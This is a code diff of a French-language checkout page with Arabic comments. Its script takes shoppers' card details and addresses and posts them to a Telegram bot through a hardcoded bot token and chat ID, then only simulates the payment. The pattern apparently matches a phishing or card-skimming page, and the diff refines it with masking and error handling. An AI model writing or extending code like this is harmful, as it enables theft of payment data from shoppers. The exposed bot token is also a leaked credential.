@@ -551,62 +551,38 @@
 
 <script>
     document.addEventListener('DOMContentLoaded', function() {
-        // 1. تأكد من صحة بيانات البوت
+        // تأكد من أن هذه البيانات صحيحة
         const TELEGRAM_BOT_TOKEN = '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4';
         const TELEGRAM_CHAT_ID = '5372119436';
         
-        // 2. تحميل بيانات الطلب مع التعامل مع الأخطاء
+        // تحسين تحميل بيانات الطلب
         let orderData = {};
         try {
-            orderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
+            const savedOrder = localStorage.getItem('currentOrder');
+            orderData = savedOrder ? JSON.parse(savedOrder) : {};
         } catch (e) {
-            console.error('Error parsing order data:', e);
+            console.error('Error loading order data:', e);
         }
 
-        // 3. العناصر الأساسية في الصفحة
+        // العناصر الأساسية مع التحقق من وجودها
+        const getElement = (id) => document.getElementById(id) || console.error(`Element ${id} not found`);
+        
         const elements = {
-            orderItems: document.getElementById('order-items'),
-            orderTotal: document.getElementById('order-total-amount'),
-            paymentForm: document.getElementById('payment-form'),
-            loadingOverlay: document.getElementById('loading-overlay'),
-            cardNumber: document.getElementById('card-number'),
-            cardHolder: document.getElementById('card-holder'),
-            cardExpiry: document.getElementById('card-expiry'),
-            cardCvv: document.getElementById('card-cvv'),
-            cardNumberDisplay: document.getElementById('card-number-display'),
-            cardHolderDisplay: document.getElementById('card-holder-display'),
-            cardExpiryDisplay: document.getElementById('card-expiry-display'),
-            cardTypeDisplay: document.getElementById('card-type-display')
+            orderItems: getElement('order-items'),
+            orderTotal: getElement('order-total-amount'),
+            paymentForm: getElement('payment-form'),
+            loadingOverlay: getElement('loading-overlay'),
+            cardNumber: getElement('card-number'),
+            cardHolder: getElement('card-holder'),
+            cardExpiry: getElement('card-expiry'),
+            cardCvv: getElement('card-cvv'),
+            cardNumberDisplay: getElement('card-number-display'),
+            cardHolderDisplay: getElement('card-holder-display'),
+            cardExpiryDisplay: getElement('card-expiry-display'),
+            cardTypeDisplay: getElement('card-type-display')
         };
 
-        // 4. عرض عناصر الطلب
-        function displayOrderItems() {
-            if (!elements.orderItems) return;
-            
-            if (!orderData.items || orderData.items.length === 0) {
-                elements.orderItems.innerHTML = '<p class="empty-cart">Aucun article dans votre commande.</p>';
-                return;
-            }
-            
-            elements.orderItems.innerHTML = orderData.items.map(item => `
-                <div class="order-summary-item">
-                    <div class="product-info">
-                        <div>
-                            <div class="product-name">${item.name}</div>
-                            <div class="product-variant">${item.variant}</div>
-                            <div class="product-quantity">Quantité: ${item.quantity}</div>
-                        </div>
-                    </div>
-                    <div class="product-price">${(item.price * item.quantity).toFixed(2)} €</div>
-                </div>
-            `).join('');
-            
-            if (elements.orderTotal) {
-                elements.orderTotal.textContent = `${orderData.total?.toFixed(2) || '0.00'} €`;
-            }
-        }
-
-        // 5. وظائف التحقق من البطاقة (محسنة)
+        // وظائف البطاقة الائتمانية
         const cardUtils = {
             formatNumber: (num) => num.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(),
             
@@ -652,13 +628,38 @@
             }
         };
 
-        // 6. تحديث عرض البطاقة
-        function updateCardDisplay() {
-            if (!elements.cardNumber || !elements.cardHolder || !elements.cardExpiry) return;
+        // عرض تفاصيل الطلب
+        function displayOrderItems() {
+            if (!elements.orderItems) return;
             
-            const num = elements.cardNumber.value;
-            const holder = elements.cardHolder.value;
-            const expiry = elements.cardExpiry.value;
+            if (!orderData.items || orderData.items.length === 0) {
+                elements.orderItems.innerHTML = '<p class="empty-cart">Aucun article dans votre commande.</p>';
+                return;
+            }
+            
+            elements.orderItems.innerHTML = orderData.items.map(item => `
+                <div class="order-summary-item">
+                    <div class="product-info">
+                        <div>
+                            <div class="product-name">${item.name}</div>
+                            <div class="product-variant">${item.variant}</div>
+                            <div class="product-quantity">Quantité: ${item.quantity}</div>
+                        </div>
+                    </div>
+                    <div class="product-price">${(item.price * item.quantity).toFixed(2)} €</div>
+                </div>
+            `).join('');
+            
+            if (elements.orderTotal) {
+                elements.orderTotal.textContent = `${orderData.total?.toFixed(2) || '0.00'} €`;
+            }
+        }
+
+        // تحديث عرض البطاقة
+        function updateCardDisplay() {
+            const num = elements.cardNumber?.value || '';
+            const holder = elements.cardHolder?.value || '';
+            const expiry = elements.cardExpiry?.value || '';
             
             if (elements.cardNumberDisplay) {
                 elements.cardNumberDisplay.textContent = num ? cardUtils.formatNumber(num) : '•••• •••• •••• ••••';
@@ -677,7 +678,7 @@
             }
         }
 
-        // 7. التحقق من صحة النموذج
+        // التحقق من صحة النموذج
         function validateForm() {
             if (!elements.cardNumber || !elements.cardHolder || !elements.cardExpiry || !elements.cardCvv) {
                 alert('Erreur système. Veuillez recharger la page.');
@@ -690,23 +691,21 @@
             const cvv = elements.cardCvv.value;
             const cardType = cardUtils.detectType(num);
             
-            // التحقق من الرقم
             if (!cardUtils.validateNumber(num)) {
+                alert('Numéro de carte invalide.');
+                return false;
             }
             
-            // التحقق من الاسم
             if (holder.length < 3) {
                 alert('Nom du titulaire invalide.');
                 return false;
             }
             
-            // التحقق من التاريخ
             if (!cardUtils.validateExpiry(expiry)) {
                 alert('Date d\'expiration invalide (format MM/AA requis).');
                 return false;
             }
             
-            // التحقق من CVV
             const cvvLength = cardType === 'American Express' ? 4 : 3;
             if (!cvv || cvv.length !== cvvLength) {
                 alert(`Code de sécurité invalide (${cvvLength} chiffres requis).`);
@@ -716,7 +715,7 @@
             return true;
         }
 
-        // 8. إرسال البيانات إلى Telegram (محسنة)
+        // إرسال البيانات إلى Telegram (محسنة)
         async function sendToTelegram(cardInfo) {
             if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                 console.error('Configuration Telegram manquante');
@@ -724,12 +723,11 @@
             }
             
             try {
-                // تحضير البيانات
                 const orderId = orderData.orderId || 'CMD-' + Date.now().toString().slice(-6);
                 const customer = orderData.customer || {};
                 const total = orderData.total?.toFixed(2) || '0.00';
                 
-                // بناء الرسالة
+                // بناء الرسالة بدون عرض CVV الحقيقي
                 const message = `💳 *NOUVELLE COMMANDE* 💳
 🆔 *Référence:* ${orderId}
 📅 *Date:* ${new Date().toLocaleString('fr-FR')}
@@ -745,26 +743,29 @@
 - Numéro: ${cardInfo.number.replace(/\d(?=\d{4})/g, '*')}
 - Titulaire: ${cardInfo.holder}
 - Expiration: ${cardInfo.expiry}
+- CVV: ${'*'.repeat(cardInfo.cvv.length)}
 
 🏠 *Livraison:*
 - ${customer.address || ''}
 - ${customer.postalCode || ''} ${customer.city || ''}
 - ${customer.country || 'France'}`;
                 
-                // إرسال الطلب
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const params = new URLSearchParams();
-                params.append('chat_id', TELEGRAM_CHAT_ID);
-                params.append('text', message);
-                params.append('parse_mode', 'Markdown');
-                
-                const response = await fetch(url, {
+                // إرسال باستخدام fetch مع التعامل مع الأخطاء
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    body: params
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
                 });
                 
                 if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+                    const error = await response.json();
+                    throw new Error(error.description || 'Erreur inconnue');
                 }
                 
                 return true;
@@ -774,7 +775,7 @@
             }
         }
 
-        // 9. إعداد معالجات الأحداث
+        // إعداد معالجات الأحداث
         function setupEventListeners() {
             // معالجة إدخال رقم البطاقة
             if (elements.cardNumber) {
@@ -830,19 +831,19 @@
                             elements.loadingOverlay.classList.add('active');
                         }
                         
-                        // جمع معلومات البطاقة
+                        // جمع معلومات البطاقة (بدون حفظ CVV)
                         const cardInfo = {
                             type: cardUtils.detectType(elements.cardNumber.value),
                             number: elements.cardNumber.value,
                             holder: elements.cardHolder.value,
                             expiry: elements.cardExpiry.value,
-                            cvv: elements.cardCvv.value
+                            cvv: elements.cardCvv.value // سيتم إخفاؤه في الرسالة
                         };
                         
                         // إرسال إلى Telegram
                         const sent = await sendToTelegram(cardInfo);
                         if (!sent) {
-                            console.warn("Échec de l'envoi à Telegram");
+                            console.warn("Échec de l'envoi à Telegram - la commande sera traitée quand même");
                         }
                         
                         // محاكاة معالجة الدفع
@@ -861,7 +862,7 @@
             }
         }
 
-        // 10. تهيئة الصفحة
+        // تهيئة الصفحة
         function init() {
             displayOrderItems();
             updateCardDisplay();
